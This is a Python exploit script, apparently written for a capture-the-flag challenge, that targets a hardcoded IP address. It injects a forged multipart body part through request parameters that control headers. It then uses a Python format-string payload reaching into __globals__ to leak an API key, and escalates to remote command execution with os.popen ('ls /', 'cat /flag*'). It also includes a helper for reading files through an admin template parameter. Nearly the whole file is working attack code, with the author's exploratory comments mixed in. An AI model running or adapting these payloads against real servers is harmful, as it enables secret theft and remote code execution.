import httpx
import re

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

def send_heartbeat_echo(text):
    """Send to heartbeat with echo action (no format string)"""
    params = {'text': text, 'client': 'X-Custom', 'token': 'value'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # Try reading some interesting files that might contain directory listing
    # In Linux, /sys/fs/cgroup can sometimes be used to read container info
    
    # Let's try to use a Jinja2 SSTI by finding a controllable file
    # Since environ contains our data, maybe we can use perf_event or other tricks
    
    # Actually, the key insight: we can use /proc/self/fd to access the request body!
    # When httpx sends a request, the body might be in an fd
    
    # Let me try a different approach - use format string to directly list files
    # The format string has access to os module via __globals__
    
    # Use popen to run command
    fmt_payload = "{0.view_functions[action].__globals__[os].popen(\"ls /\").read()}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    print(f"[*] Payload length: {len(text)}")
    
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    print(f"[*] Response: {r.text}")
    
    # If that doesn't work, try shorter command
    print("\n[*] Trying with cat /flag*")
    fmt_payload2 = "{0.view_functions[action].__globals__[os].popen(\"cat /flag*\").read()}"
    text2 = fmt_payload2 + fake_action_part
    print(f"[*] Payload length: {len(text2)}")
    params2 = {'text': text2, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r2 = httpx.post(f'{TARGET}/heartbeat', data=params2, timeout=10.0)
    print(f"[*] Response: {r2.text}")
